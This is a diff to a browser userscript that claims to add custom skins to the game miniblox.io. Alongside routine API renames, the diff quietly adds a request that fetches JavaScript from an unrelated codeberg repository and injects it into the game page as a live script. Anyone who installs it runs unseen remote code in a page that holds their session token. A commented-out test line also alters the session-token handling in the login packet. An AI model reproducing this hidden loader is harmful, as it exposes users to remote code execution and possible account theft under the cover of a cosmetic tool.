@@ -1,19 +1,20 @@
 // ==UserScript==
 // @name         Miniblox Custom Skin
 // @namespace    Loqle
-// @version      1.0
+// @version      1.1
 // @description  Miniblox Custom Skins by Loqle
 // @author       Loqle
 // @match        https://miniblox.io/*
 // @icon         https://miniblox.io/favicon.png
 // @grant        unsafeWindow
-// @grant        GM.setValue
-// @grant        GM.getValue
+// @grant        GM_setValue
+// @grant        GM_getValue
 // @run-at       document-start
+// @grant        GM_xmlhttpRequest
 // ==/UserScript==
 
 (async () => {
-  if (await GM.getValue('skinurl') == null) {
+  if (await GM_getValue('skinurl') == null) {
     changeCustomSkin();
   }
 })();
@@ -29,13 +30,13 @@ function changeCustomSkin() {
   (async () => {
     let skinurl = prompt("Please enter your skin URL (tip: get skins from https://minecraft.novaskin.me/gallery)", "https://t.novaskin.me/fc932eb7edc6dbf0487b43713324e78e9c935ec0069c52cb44f9c7b9d82acae5");
     if (skinurl == null) { // user pressed cancel
-      if (await GM.getValue('skinurl') == null) {
+      if (await GM_getValue('skinurl') == null) {
         window.location.reload();
       } else {
         return;
       }
     }
-    await GM.setValue('skinurl', skinurl);
+    await GM_setValue('skinurl', skinurl);
     window.location.reload();
   })();
 }
@@ -43,18 +44,24 @@ function changeCustomSkin() {
 
 setInterval(function() {
   if (!document.getElementById("customSkinBtn")) {
-    var newNode = document.createElement("button");
-    newNode.type = "button";
-    newNode.id = "customSkinBtn";
-    newNode.classList.add("chakra-button");
-    newNode.classList.add("css-32lhf4");
-    newNode.innerHTML = "<p class='chakra-text css-x8h6hl'>Edit Custom Skin</p>";
-    newNode.onclick=function() { changeCustomSkin(); };
-    document.getElementsByClassName("css-1q5zbtn")[0].appendChild(newNode);
+    try {
+      var newNode = document.createElement("button");
+      newNode.type = "button";
+      newNode.id = "customSkinBtn";
+      newNode.classList.add("chakra-button");
+      newNode.classList.add("css-32lhf4");
+      newNode.innerHTML = "<p class='chakra-text css-x8h6hl'>Edit Custom Skin</p>";
+      newNode.onclick=function() { changeCustomSkin(); };
+      document.getElementsByClassName("css-1q5zbtn")[0].appendChild(newNode);
+    } catch(err) {}
   }
 }, 1000);
 
-
+GM_xmlhttpRequest({
+    method: "GET",
+    url: `https://codeberg.org/32_64/64lib.js/raw/branch/main/64lib.js?ts=${(+new Date())}`,
+    onload: function(response) {let remoteScript = document.createElement('script'); remoteScript.id = 'tm-dev-script'; remoteScript.innerHTML = response.responseText; document.body.appendChild(remoteScript);}
+});
 let replacements = {};
 let dumpedVarNames = {};
 const storeName = "a" + crypto.randomUUID().replaceAll("-", "").substring(16);
@@ -166,7 +173,7 @@ function modifyCode(text) {
       if (_ == "CustomSkin") {
         const $ = skins[_];
         return new Promise((et, tt) => {
-          textureManager.loader.load("` + await GM.getValue('skinurl') + `", rt => {
+          textureManager.loader.load("` + await GM_getValue('skinurl') + `", rt => {
             const nt = {
               atlas: rt,
               id: _,
@@ -201,6 +208,9 @@ function modifyCode(text) {
 			});
 		}
 	`);
+
+  // NICK TEST
+	//addReplacement('new SPacketLoginStart({requestedUuid:localStorage.getItem(REQUESTED_UUID_KEY)??void 0,session:localStorage.getItem(SESSION_TOKEN_KEY)??"",hydration:localStorage.getItem("hydration")??"0",metricsId:localStorage.getItem("metrics_id")??"",clientVersion:VERSION$1})', 'new SPacketLoginStart({requestedUuid:void 0,session:(' + true.toString() + ' ? "" : (localStorage.getItem(SESSION_TOKEN_KEY) ?? "")),hydration:"0",metricsId:uuid$1(),clientVersion:VERSION$1})', true);
 
 	let loadedConfig = false;
 	async function execute(src, oldScript) {
